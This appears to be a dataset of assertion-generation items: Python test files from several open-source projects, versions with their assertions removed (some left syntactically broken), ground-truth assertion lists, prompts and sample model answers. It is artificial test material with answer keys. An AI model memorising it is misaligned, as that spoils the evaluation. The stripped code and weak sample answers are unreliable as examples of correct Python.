[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['args', 'options', 'parser', 'browser_to_create', 'times', 'start', 'N', 'avg', 'squared_diffs', 'stdev', 'percentile_75', 'print ""%s: avg=%f; stdev=%f; min=%f; 75th percentile']
*Code:

1#!/usr/bin/env python
2# Copyright (c) 2012 The Chromium Authors. All rights reserved.
3# Use of this source code is governed by a BSD-style license that can be
4# found in the LICENSE file.
5import os
6import sys
7import time
8
9sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
10
11import telemetry
12
13def Main(args):
14  options = telemetry.BrowserOptions()
15  parser = options.CreateParser('telemetry_perf_test.py')
16  options, args = parser.parse_args(args)
17
18  browser_to_create = telemetry.FindBrowser(options)
19  with browser_to_create.Create() as b:
20    with b.ConnectToNthTab(0) as tab:
21
22      # Measure round-trip-time for evaluate
23      times = []
24      for i in range(1000):
25        start = time.time()
26        tab.runtime.Evaluate('%i * 2' % i)
27        times.append(time.time() - start)
28      N = float(len(times))
29      avg = sum(times, 0.0) / N
30      squared_diffs = [(t - avg) * (t - avg) for t in times]
31      stdev = sum(squared_diffs, 0.0) / (N - 1)
32      times.sort()
33      percentile_75 = times[int(0.75 * N)]
34
35      print ""%s: avg=%f; stdev=%f; min=%f; 75th percentile = %f"" % (
36        ""Round trip time (seconds)"",
37        avg, stdev, min(times), percentile_75)
38
39  return 0
40
41if __name__ == '__main__':
42  sys.exit(Main(sys.argv[1:]))
43",2888,"[[13, 'args', '!=', None, ""the main function can't take None as input""],
 [27, 'times', '==', 1000, 'We should end up with 1000 times samples for accurate calculations'],
 [29, 'N', '==', 1000, 'The total samples count must be 1000 as per calculations'],
 [31, 'stdev', '>=', 0, 'Standard deviation can never be negative'],
 [33, 'percentile_75', '>=', 0, '75th percentile time should be a positive number']]"
chouseknecht/ansible,"# -*- coding: utf-8 -*-
#
# Copyright: (c) 2019, F5 Networks Inc.
# GNU General Public License v3.0 (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)

from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

import os
import json
import pytest
import sys

if sys.version_info < (2, 7):
    pytestmark = pytest.mark.skip(""F5 Ansible modules require Python >= 2.7"")

from ansible.module_utils.basic import AnsibleModule

try:
    from library.modules.bigip_apm_network_access import ApiParameters
    from library.modules.bigip_apm_network_access import ModuleParameters
    from library.modules.bigip_apm_network_access import ModuleManager
    from library.modules.bigip_apm_network_access import ArgumentSpec

    # In Ansible 2.8, Ansible changed import paths.
    from test.units.compat import unittest
    from test.units.compat.mock import Mock

    from test.units.modules.utils import set_module_args
except ImportError:
    from ansible.modules.network.f5.bigip_apm_network_access import ApiParameters
    from ansible.modules.network.f5.bigip_apm_network_access import ModuleParameters
    from ansible.modules.network.f5.bigip_apm_network_access import ModuleManager
    from ansible.modules.network.f5.bigip_apm_network_access import ArgumentSpec

    # Ansible 2.8 imports
    from units.compat import unittest
    from units.compat.mock import Mock

    from units.modules.utils import set_module_args


fixture_path = os.path.join(os.path.dirname(__file__), 'fixtures')
fixture_data = {}


def load_fixture(name):
    path = os.path.join(fixture_path, name)

    if path in fixture_data:
        return fixture_data[path]

    with open(path) as f:
        data = f.read()

    try:
        data = json.loads(data)
    except Exception:
        pass

    fixture_data[path] = data
    return data


class TestParameters(unittest.TestCase):
    def test_module_parameters(self):
        args = dict(
            name='foo',
            ip_version='ipv4',
            split_tunnel=True,
            description='foobar',
            allow_local_subnet=True,
            allow_local_dns=True,
            snat_pool='foo_pool',
            dtls=True,
            dtls_port=4443,
            ipv4_lease_pool='ipv4lease',
            excluded_ipv4_adresses=[dict(subnet='10.10.10.1')],
            ipv4_address_space=[dict(subnet='192.168.1.0/24')],
            dns_address_space=['foobar.com'],
            excluded_dns_addresses=['bar-foo.org']
        )

        p = ModuleParameters(params=args)
        assert p.name == 'foo'
        assert p.ip_version == 'ipv4'
        assert p.split_tunnel == 'true'
        assert p.allow_local_subnet == 'true'
        assert p.allow_local_dns == 'true'
        assert p.snat_pool == '/Common/foo_pool'
        assert p.description == 'foobar'
        assert p.dtls == 'true'
        assert p.dtls_port == 4443
        assert p.ipv4_lease_pool == '/Common/ipv4lease'
        assert p.excluded_ipv4_adresses == [dict(subnet='10.10.10.1/32')]
        assert p.ipv4_address_space == [dict(subnet='192.168.1.0/24')]
        assert p.dns_address_space == ['foobar.com']
        assert p.excluded_dns_addresses == ['bar-foo.org']

    def test_api_parameters(self):
        args = load_fixture('load_apm_network_access.json')

        p = ApiParameters(params=args)
        assert p.name == 'test'
        assert p.ip_version == 'ipv4-ipv6'
        assert p.split_tunnel == 'true'
        assert p.allow_local_subnet == 'true'
        assert p.allow_local_dns == 'true'
        assert p.snat_pool == 'automap'
        assert p.dtls == 'false'
        assert p.dtls_port == 4433
        assert p.ipv4_lease_pool == '/Common/ipv4lease'
        assert p.excluded_ipv4_adresses == [
            dict(subnet='192.168.1.0/24'),
            dict(subnet='192.168.2.1/32')
        ]
        assert p.ipv4_address_space == [
            dict(subnet='10.10.10.1/32'),
            dict(subnet='10.11.11.0/24')
        ]
        assert p.dns_address_space == ['foo.com', 'bar.com']
        assert p.excluded_dns_addresses == ['baz.com', 'bazfoo.com']
        assert p.ipv6_address_space == [dict(subnet=""2607:f0d0:1002:51::4/128"")]


class TestManager(unittest.TestCase):
    def setUp(self):
        self.spec = ArgumentSpec()

    def test_create_ipv4_net_access(self, *args):
        set_module_args(dict(
            name='foo',
            ip_version='ipv4',
            split_tunnel=True,
            description='foobar',
            allow_local_subnet=True,
            allow_local_dns=True,
            snat_pool='foo_pool',
            dtls=True,
            dtls_port=4443,
            ipv4_lease_pool='ipv4lease',
            excluded_ipv4_adresses=[dict(subnet='10.10.10.1')],
            ipv4_address_space=[dict(subnet='192.168.1.0/24')],
            dns_address_space=['foobar.com'],
            excluded_dns_addresses=['bar-foo.org'],
            provider=dict(
                server='localhost',
                password='password',
                user='admin'
            )
        ))

        module = AnsibleModule(
            argument_spec=self.spec.argument_spec,
            supports_check_mode=self.spec.supports_check_mode,
        )

        # Override methods in the specific type of manager
        mm = ModuleManager(module=module)
        mm.exists = Mock(return_value=False)
        mm.create_on_device = Mock(return_value=True)

        results = mm.exec_module()

        assert results['changed'] is True
        assert results['ip_version'] == 'ipv4'
        assert results['split_tunnel'] == 'yes'
        assert results['allow_local_subnet'] == 'yes'
        assert results['allow_local_dns'] == 'yes'
        assert results['snat_pool'] == '/Common/foo_pool'
        assert results['description'] == 'foobar'
        assert results['dtls'] == 'yes'
        assert results['dtls_port'] == 4443
        assert results['ipv4_lease_pool'] == '/Common/ipv4lease'
        assert results['excluded_ipv4_adresses'] == [dict(subnet='10.10.10.1')]
        assert results['ipv4_address_space'] == [dict(subnet='192.168.1.0/24')]
        assert results['dns_address_space'] == ['foobar.com']
        assert results['excluded_dns_addresses'] == ['bar-foo.org']

    def test_update_ipv4_net_access(self, *args):
        set_module_args(dict(
            name='test',
            excluded_ipv4_adresses=[dict(subnet='10.10.10.1')],
            ipv4_address_space=[dict(subnet='192.168.1.0/24')],
            provider=dict(
                server='localhost',
                password='password',
                user='admin'
            )
        ))

        current = ApiParameters(params=load_fixture('load_apm_network_access.json'))

        module = AnsibleModule(
            argument_spec=self.spec.argument_spec,
            supports_check_mode=self.spec.supports_check_mode,
        )

        # Override methods in the specific type of manager
        mm = ModuleManager(module=module)
        mm.exists = Mock(return_value=True)
        mm.update_on_device = Mock(return_value=True)
        mm.read_current_from_device = Mock(return_value=current)

        results = mm.exec_module()

        assert results['changed'] is True
        assert results['excluded_ipv4_adresses'] == [dict(subnet='10.10.10.1')]
        assert results['ipv4_address_space'] == [dict(subnet='192.168.1.0/24')]
","
1# -*- coding: utf-8 -*-
2#
3# Copyright: (c) 2019, F5 Networks Inc.
4# GNU General Public License v3.0 (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)
5
6from __future__ import (absolute_import, division, print_function)
7__metaclass__ = type
8
9import os
10import json
11import pytest
12import sys
13
14if sys.version_info < (2, 7):
15    pytestmark = pytest.mark.skip(""F5 Ansible modules require Python >= 2.7"")
16
17from ansible.module_utils.basic import AnsibleModule
18
19try:
20    from library.modules.bigip_apm_network_access import ApiParameters
21    from library.modules.bigip_apm_network_access import ModuleParameters
22    from library.modules.bigip_apm_network_access import ModuleManager
23    from library.modules.bigip_apm_network_access import ArgumentSpec
24
25    # In Ansible 2.8, Ansible changed import paths.
26    from test.units.compat import unittest
27    from test.units.compat.mock import Mock
28
29    from test.units.modules.utils import set_module_args
30except ImportError:
31    from ansible.modules.network.f5.bigip_apm_network_access import ApiParameters
32    from ansible.modules.network.f5.bigip_apm_network_access import ModuleParameters
33    from ansible.modules.network.f5.bigip_apm_network_access import ModuleManager
34    from ansible.modules.network.f5.bigip_apm_network_access import ArgumentSpec
35
36    # Ansible 2.8 imports
37    from units.compat import unittest
38    from units.compat.mock import Mock
39
40    from units.modules.utils import set_module_args
41
42
43fixture_path = os.path.join(os.path.dirname(__file__), 'fixtures')
44fixture_data = {}
45
46
47def load_fixture(name):
48    path = os.path.join(fixture_path, name)
49
50    if path in fixture_data:
51        return fixture_data[path]
52
53    with open(path) as f:
54        data = f.read()
55
56    try:
57        data = json.loads(data)
58    except Exception:
59        pass
60
61    fixture_data[path] = data
62    return data
63
64
65class TestParameters(unittest.TestCase):
66    def test_module_parameters(self):
67        args = dict(
68            name='foo',
69            ip_version='ipv4',
70            split_tunnel=True,
71            description='foobar',
72            allow_local_subnet=True,
73            allow_local_dns=True,
74            snat_pool='foo_pool',
75            dtls=True,
76            dtls_port=4443,
77            ipv4_lease_pool='ipv4lease',
78            excluded_ipv4_adresses=[dict(subnet='10.10.10.1')],
79            ipv4_address_space=[dict(subnet='192.168.1.0/24')],
80            dns_address_space=['foobar.com'],
81            excluded_dns_addresses=['bar-foo.org']
82        )
83
84        p = ModuleParameters(params=args)
85
86    def test_api_parameters(self):
87        args = load_fixture('load_apm_network_access.json')
88
89        p = ApiParameters(params=args)
90            dict(subnet='192.168.1.0/24'),
91            dict(subnet='192.168.2.1/32')
92        ]
93            dict(subnet='10.10.10.1/32'),
94            dict(subnet='10.11.11.0/24')
95        ]
96
97
98class TestManager(unittest.TestCase):
99    def setUp(self):
100        self.spec = ArgumentSpec()
101
102    def test_create_ipv4_net_access(self, *args):
103        set_module_args(dict(
104            name='foo',
105            ip_version='ipv4',
106            split_tunnel=True,
107            description='foobar',
108            allow_local_subnet=True,
109            allow_local_dns=True,
110            snat_pool='foo_pool',
111            dtls=True,
112            dtls_port=4443,
113            ipv4_lease_pool='ipv4lease',
114            excluded_ipv4_adresses=[dict(subnet='10.10.10.1')],
115            ipv4_address_space=[dict(subnet='192.168.1.0/24')],
116            dns_address_space=['foobar.com'],
117            excluded_dns_addresses=['bar-foo.org'],
118            provider=dict(
119                server='localhost',
120                password='password',
121                user='admin'
122            )
123        ))
124
125        module = AnsibleModule(
126            argument_spec=self.spec.argument_spec,
127            supports_check_mode=self.spec.supports_check_mode,
128        )
129
130        # Override methods in the specific type of manager
131        mm = ModuleManager(module=module)
132        mm.exists = Mock(return_value=False)
133        mm.create_on_device = Mock(return_value=True)
134
135        results = mm.exec_module()
136
137
138    def test_update_ipv4_net_access(self, *args):
139        set_module_args(dict(
140            name='test',
141            excluded_ipv4_adresses=[dict(subnet='10.10.10.1')],
142            ipv4_address_space=[dict(subnet='192.168.1.0/24')],
143            provider=dict(
144                server='localhost',
145                password='password',
146                user='admin'
147            )
148        ))
149
150        current = ApiParameters(params=load_fixture('load_apm_network_access.json'))
151
152        module = AnsibleModule(
153            argument_spec=self.spec.argument_spec,
154            supports_check_mode=self.spec.supports_check_mode,
155        )
156
157        # Override methods in the specific type of manager
158        mm = ModuleManager(module=module)
159        mm.exists = Mock(return_value=True)
160        mm.update_on_device = Mock(return_value=True)
161        mm.read_current_from_device = Mock(return_value=current)
162
163        results = mm.exec_module()
164
165","[['p.name', '==', ""'foo'""], ['p.ip_version', '==', ""'ipv4'""], ['p.split_tunnel', '==', ""'true'""], ['p.allow_local_subnet', '==', ""'true'""], ['p.allow_local_dns', '==', ""'true'""], ['p.snat_pool', '==', ""'/Common/foo_pool'""], ['p.description', '==', ""'foobar'""], ['p.dtls', '==', ""'true'""], ['p.dtls_port', '==', '4443'], ['p.ipv4_lease_pool', '==', ""'/Common/ipv4lease'""], ['p.excluded_ipv4_adresses', '==', ""[dict(subnet='10.10.10.1/32')]""], ['p.ipv4_address_space', '==', ""[dict(subnet='192.168.1.0/24')]""], ['p.dns_address_space', '==', ""['foobar.com']""], ['p.excluded_dns_addresses', '==', ""['bar-foo.org']""], ['p.name', '==', ""'test'""], ['p.ip_version', '==', ""'ipv4-ipv6'""], ['p.split_tunnel', '==', ""'true'""], ['p.allow_local_subnet', '==', ""'true'""], ['p.allow_local_dns', '==', ""'true'""], ['p.snat_pool', '==', ""'automap'""], ['p.dtls', '==', ""'false'""], ['p.dtls_port', '==', '4433'], ['p.ipv4_lease_pool', '==', ""'/Common/ipv4lease'""], ['p.excluded_ipv4_adresses', '==', '['], ['p.ipv4_address_space', '==', '['], ['p.dns_address_space', '==', ""['foo.com'""], ['p.excluded_dns_addresses', '==', ""['baz.com'""], ['p.ipv6_address_space', '==', '[dict(subnet=""2607:f0d0:1002:51::4/128"")]'], [""results['changed']"", '==', 'True'], [""results['ip_version']"", '==', ""'ipv4'""], [""results['split_tunnel']"", '==', ""'yes'""], [""results['allow_local_subnet']"", '==', ""'yes'""], [""results['allow_local_dns']"", '==', ""'yes'""], [""results['snat_pool']"", '==', ""'/Common/foo_pool'""], [""results['description']"", '==', ""'foobar'""], [""results['dtls']"", '==', ""'yes'""], [""results['dtls_port']"", '==', '4443'], [""results['ipv4_lease_pool']"", '==', ""'/Common/ipv4lease'""], [""results['excluded_ipv4_adresses']"", '==', ""[dict(subnet='10.10.10.1')]""], [""results['ipv4_address_space']"", '==', ""[dict(subnet='192.168.1.0/24')]""], [""results['dns_address_space']"", '==', ""['foobar.com']""], [""results['excluded_dns_addresses']"", '==', ""['bar-foo.org']""], [""results['changed']"", '==', 'True'], [""results['excluded_ipv4_adresses']"", '==', ""[dict(subnet='10.10.10.1')]""], [""results['ipv4_address_space']"", '==', ""[dict(subnet='192.168.1.0/24')]""]]",45,45,1.0,0.0060827250608272,"['__metaclass__', 'pytestmark', 'fixture_path', 'fixture_data', 'name', 'path', 'data', 'fixture_data[path]', 'args', 'p', 'self.spec', '*args', 'module', 'mm', 'mm.exists', 'mm.create_on_device', 'results', 'current', 'mm.update_on_device', 'mm.read_current_from_device']",20,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['__metaclass__', 'pytestmark', 'fixture_path', 'fixture_data', 'name', 'path', 'data', 'fixture_data[path]', 'args', 'p', 'self.spec', '*args', 'module', 'mm', 'mm.exists', 'mm.create_on_device', 'results', 'current', 'mm.update_on_device', 'mm.read_current_from_device']
*Code:

1# -*- coding: utf-8 -*-
2#
3# Copyright: (c) 2019, F5 Networks Inc.
4# GNU General Public License v3.0 (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)
5
6from __future__ import (absolute_import, division, print_function)
7__metaclass__ = type
8
9import os
10import json
11import pytest
12import sys
13
14if sys.version_info < (2, 7):
15    pytestmark = pytest.mark.skip(""F5 Ansible modules require Python >= 2.7"")
16
17from ansible.module_utils.basic import AnsibleModule
18
19try:
20    from library.modules.bigip_apm_network_access import ApiParameters
21    from library.modules.bigip_apm_network_access import ModuleParameters
22    from library.modules.bigip_apm_network_access import ModuleManager
23    from library.modules.bigip_apm_network_access import ArgumentSpec
24
25    # In Ansible 2.8, Ansible changed import paths.
26    from test.units.compat import unittest
27    from test.units.compat.mock import Mock
28
29    from test.units.modules.utils import set_module_args
30except ImportError:
31    from ansible.modules.network.f5.bigip_apm_network_access import ApiParameters
32    from ansible.modules.network.f5.bigip_apm_network_access import ModuleParameters
33    from ansible.modules.network.f5.bigip_apm_network_access import ModuleManager
34    from ansible.modules.network.f5.bigip_apm_network_access import ArgumentSpec
35
36    # Ansible 2.8 imports
37    from units.compat import unittest
38    from units.compat.mock import Mock
39
40    from units.modules.utils import set_module_args
41
42
43fixture_path = os.path.join(os.path.dirname(__file__), 'fixtures')
44fixture_data = {}
45
46
47def load_fixture(name):
48    path = os.path.join(fixture_path, name)
49
50    if path in fixture_data:
51        return fixture_data[path]
52
53    with open(path) as f:
54        data = f.read()
55
56    try:
57        data = json.loads(data)
58    except Exception:
59        pass
60
61    fixture_data[path] = data
62    return data
63
64
65class TestParameters(unittest.TestCase):
66    def test_module_parameters(self):
67        args = dict(
68            name='foo',
69            ip_version='ipv4',
70            split_tunnel=True,
71            description='foobar',
72            allow_local_subnet=True,
73            allow_local_dns=True,
74            snat_pool='foo_pool',
75            dtls=True,
76            dtls_port=4443,
77            ipv4_lease_pool='ipv4lease',
78            excluded_ipv4_adresses=[dict(subnet='10.10.10.1')],
79            ipv4_address_space=[dict(subnet='192.168.1.0/24')],
80            dns_address_space=['foobar.com'],
81            excluded_dns_addresses=['bar-foo.org']
82        )
83
84        p = ModuleParameters(params=args)
85
86    def test_api_parameters(self):
87        args = load_fixture('load_apm_network_access.json')
88
89        p = ApiParameters(params=args)
90            dict(subnet='192.168.1.0/24'),
91            dict(subnet='192.168.2.1/32')
92        ]
93            dict(subnet='10.10.10.1/32'),
94            dict(subnet='10.11.11.0/24')
95        ]
96
97
98class TestManager(unittest.TestCase):
99    def setUp(self):
100        self.spec = ArgumentSpec()
101
102    def test_create_ipv4_net_access(self, *args):
103        set_module_args(dict(
104            name='foo',
105            ip_version='ipv4',
106            split_tunnel=True,
107            description='foobar',
108            allow_local_subnet=True,
109            allow_local_dns=True,
110            snat_pool='foo_pool',
111            dtls=True,
112            dtls_port=4443,
113            ipv4_lease_pool='ipv4lease',
114            excluded_ipv4_adresses=[dict(subnet='10.10.10.1')],
115            ipv4_address_space=[dict(subnet='192.168.1.0/24')],
116            dns_address_space=['foobar.com'],
117            excluded_dns_addresses=['bar-foo.org'],
118            provider=dict(
119                server='localhost',
120                password='password',
121                user='admin'
122            )
123        ))
124
125        module = AnsibleModule(
126            argument_spec=self.spec.argument_spec,
127            supports_check_mode=self.spec.supports_check_mode,
128        )
129
130        # Override methods in the specific type of manager
131        mm = ModuleManager(module=module)
132        mm.exists = Mock(return_value=False)
133        mm.create_on_device = Mock(return_value=True)
134
135        results = mm.exec_module()
136
137
138    def test_update_ipv4_net_access(self, *args):
139        set_module_args(dict(
140            name='test',
141            excluded_ipv4_adresses=[dict(subnet='10.10.10.1')],
142            ipv4_address_space=[dict(subnet='192.168.1.0/24')],
143            provider=dict(
144                server='localhost',
145                password='password',
146                user='admin'
147            )
148        ))
149
150        current = ApiParameters(params=load_fixture('load_apm_network_access.json'))
151
152        module = AnsibleModule(
153            argument_spec=self.spec.argument_spec,
154            supports_check_mode=self.spec.supports_check_mode,
155        )
156
157        # Override methods in the specific type of manager
158        mm = ModuleManager(module=module)
159        mm.exists = Mock(return_value=True)
160        mm.update_on_device = Mock(return_value=True)
161        mm.read_current_from_device = Mock(return_value=current)
162
163        results = mm.exec_module()
164
165",7114,"[[47, 'name', '!=', None, ""function load_fixture requires a name for the fixture""], 
 [103, '*args', '!=', None, ""the function test_create_ipv4_net_access can take in arguments""], 
 [139, '*args', '!=', None, ""the function test_update_ipv4_net_access can take in arguments""], 
 [105, 'name', '!=', None, ""a name is required to create ipv4 network access""],
 [104, 'name', '!=', None, ""a name is required to set_module_args""],
 [129, 'self.spec', '!=', None, ""self.spec has to be declared before being used""], 
 [149, 'name', '!=', None, ""a name is required to set_module_args""], 
 [152, 'self.spec', '!=', None, ""self.spec has to be declared before being used""]]"
rmoorman/sqlalchemy-continuum,"import pytest
from sqlalchemy_continuum.plugins import NullDeletePlugin
from tests import TestCase, uses_native_versioning


class DeleteTestCase(TestCase):
    def _delete(self):
        article = self.Article()
        article.name = u'Some article'
        article.content = u'Some content'
        self.session.add(article)
        self.session.commit()

        self.session.delete(article)
        self.session.commit()

    def test_stores_operation_type(self):
        self._delete()
        versions = self.session.query(self.ArticleVersion).all()
        assert versions[1].operation_type == 2


@pytest.mark.skipif('uses_native_versioning()')
class TestDeleteWithoutStoreDataAtDelete(DeleteTestCase):
    plugins = [NullDeletePlugin()]

    def test_creates_versions_on_delete(self):
        self._delete()
        versions = self.session.query(self.ArticleVersion).all()
        assert len(versions) == 2
        assert versions[1].name is None
        assert versions[1].content is None
","
1import pytest
2from sqlalchemy_continuum.plugins import NullDeletePlugin
3from tests import TestCase, uses_native_versioning
4
5
6class DeleteTestCase(TestCase):
7    def _delete(self):
8        article = self.Article()
9        article.name = u'Some article'
10        article.content = u'Some content'
11        self.session.add(article)
12        self.session.commit()
13
14        self.session.delete(article)
15        self.session.commit()
16
17    def test_stores_operation_type(self):
18        self._delete()
19        versions = self.session.query(self.ArticleVersion).all()
20
21
22@pytest.mark.skipif('uses_native_versioning()')
23class TestDeleteWithoutStoreDataAtDelete(DeleteTestCase):
24    plugins = [NullDeletePlugin()]
25
26    def test_creates_versions_on_delete(self):
27        self._delete()
28        versions = self.session.query(self.ArticleVersion).all()
29","[['versions[1].operation_type', '==', '2'], ['len(versions)', '==', '2'], ['versions[1].name', '==', 'None'], ['versions[1].content', '==', 'None']]",4,4,1.0,0.004,"['article', 'article.name', 'article.content', 'versions', 'plugins']",5,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['article', 'article.name', 'article.content', 'versions', 'plugins']
*Code:

1import pytest
2from sqlalchemy_continuum.plugins import NullDeletePlugin
3from tests import TestCase, uses_native_versioning
4
5
6class DeleteTestCase(TestCase):
7    def _delete(self):
8        article = self.Article()
9        article.name = u'Some article'
10        article.content = u'Some content'
11        self.session.add(article)
12        self.session.commit()
13
14        self.session.delete(article)
15        self.session.commit()
16
17    def test_stores_operation_type(self):
18        self._delete()
19        versions = self.session.query(self.ArticleVersion).all()
20
21
22@pytest.mark.skipif('uses_native_versioning()')
23class TestDeleteWithoutStoreDataAtDelete(DeleteTestCase):
24    plugins = [NullDeletePlugin()]
25
26    def test_creates_versions_on_delete(self):
27        self._delete()
28        versions = self.session.query(self.ArticleVersion).all()
29",2335,"[[8, 'article', '!=', None, ""article object must be initialized""],
 [9, 'article.name', '!=', None, ""article.name should not be None""],
 [10, 'article.content', '!=', None, ""article.content should not be None""],
 [19, 'versions', '!=', None, ""versions should not be None after query""],
 [28, 'versions', '!=', None, ""versions should not be None after query""],
 [24, 'plugins', '!=', None, ""plugins should not be None""]]"
toddeye/home-assistant,"""""""Test against characteristics captured from a eufycam.""""""

from tests.components.homekit_controller.common import (
    HUB_TEST_ACCESSORY_ID,
    DeviceTestInfo,
    EntityTestInfo,
    assert_devices_and_entities_created,
    setup_accessories_from_file,
    setup_test_accessories,
)


async def test_eufycam_setup(hass):
    """"""Test that a eufycam can be correctly setup in HA.""""""
    accessories = await setup_accessories_from_file(hass, ""anker_eufycam.json"")
    await setup_test_accessories(hass, accessories)

    await assert_devices_and_entities_created(
        hass,
        DeviceTestInfo(
            unique_id=HUB_TEST_ACCESSORY_ID,
            name=""eufy HomeBase2-0AAA"",
            model=""T8010"",
            manufacturer=""Anker"",
            sw_version=""2.1.6"",
            hw_version=""2.0.0"",
            serial_number=""A0000A000000000A"",
            devices=[
                DeviceTestInfo(
                    name=""eufyCam2-0000"",
                    model=""T8113"",
                    manufacturer=""Anker"",
                    sw_version=""1.6.7"",
                    hw_version=""1.0.0"",
                    serial_number=""A0000A000000000D"",
                    unique_id=""00:00:00:00:00:00:aid:4"",
                    devices=[],
                    entities=[
                        EntityTestInfo(
                            entity_id=""camera.eufycam2_0000"",
                            friendly_name=""eufyCam2-0000"",
                            unique_id=""homekit-A0000A000000000D-aid:4"",
                            state=""idle"",
                        ),
                    ],
                ),
            ],
            entities=[],
        ),
    )

    # There are multiple rtsp services, we only want to create 1
    # camera entity per accessory, not 1 camera per service.
    cameras_count = 0
    for state in hass.states.async_all():
        if state.entity_id.startswith(""camera.""):
            cameras_count += 1
    assert cameras_count == 3
","
1""""""Test against characteristics captured from a eufycam.""""""
2
3from tests.components.homekit_controller.common import (
4    HUB_TEST_ACCESSORY_ID,
5    DeviceTestInfo,
6    EntityTestInfo,
7    setup_accessories_from_file,
8    setup_test_accessories,
9)
10
11
12async def test_eufycam_setup(hass):
13    """"""Test that a eufycam can be correctly setup in HA.""""""
14    accessories = await setup_accessories_from_file(hass, ""anker_eufycam.json"")
15    await setup_test_accessories(hass, accessories)
16
17        hass,
18        DeviceTestInfo(
19            unique_id=HUB_TEST_ACCESSORY_ID,
20            name=""eufy HomeBase2-0AAA"",
21            model=""T8010"",
22            manufacturer=""Anker"",
23            sw_version=""2.1.6"",
24            hw_version=""2.0.0"",
25            serial_number=""A0000A000000000A"",
26            devices=[
27                DeviceTestInfo(
28                    name=""eufyCam2-0000"",
29                    model=""T8113"",
30                    manufacturer=""Anker"",
31                    sw_version=""1.6.7"",
32                    hw_version=""1.0.0"",
33                    serial_number=""A0000A000000000D"",
34                    unique_id=""00:00:00:00:00:00:aid:4"",
35                    devices=[],
36                    entities=[
37                        EntityTestInfo(
38                            entity_id=""camera.eufycam2_0000"",
39                            friendly_name=""eufyCam2-0000"",
40                            unique_id=""homekit-A0000A000000000D-aid:4"",
41                            state=""idle"",
42                        ),
43                    ],
44                ),
45            ],
46            entities=[],
47        ),
48    )
49
50    # There are multiple rtsp services, we only want to create 1
51    # camera entity per accessory, not 1 camera per service.
52    cameras_count = 0
53    for state in hass.states.async_all():
54        if state.entity_id.startswith(""camera.""):
55            cameras_count += 1
56","[['_entities_created', '==', 'True'], ['_entities_created(', '==', 'True'], ['cameras_count', '==', '3']]",3,3,1.0,0.0015067805123053,"['hass', 'accessories', 'cameras_count']",3,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['hass', 'accessories', 'cameras_count']
*Code:

1""""""Test against characteristics captured from a eufycam.""""""
2
3from tests.components.homekit_controller.common import (
4    HUB_TEST_ACCESSORY_ID,
5    DeviceTestInfo,
6    EntityTestInfo,
7    setup_accessories_from_file,
8    setup_test_accessories,
9)
10
11
12async def test_eufycam_setup(hass):
13    """"""Test that a eufycam can be correctly setup in HA.""""""
14    accessories = await setup_accessories_from_file(hass, ""anker_eufycam.json"")
15    await setup_test_accessories(hass, accessories)
16
17        hass,
18        DeviceTestInfo(
19            unique_id=HUB_TEST_ACCESSORY_ID,
20            name=""eufy HomeBase2-0AAA"",
21            model=""T8010"",
22            manufacturer=""Anker"",
23            sw_version=""2.1.6"",
24            hw_version=""2.0.0"",
25            serial_number=""A0000A000000000A"",
26            devices=[
27                DeviceTestInfo(
28                    name=""eufyCam2-0000"",
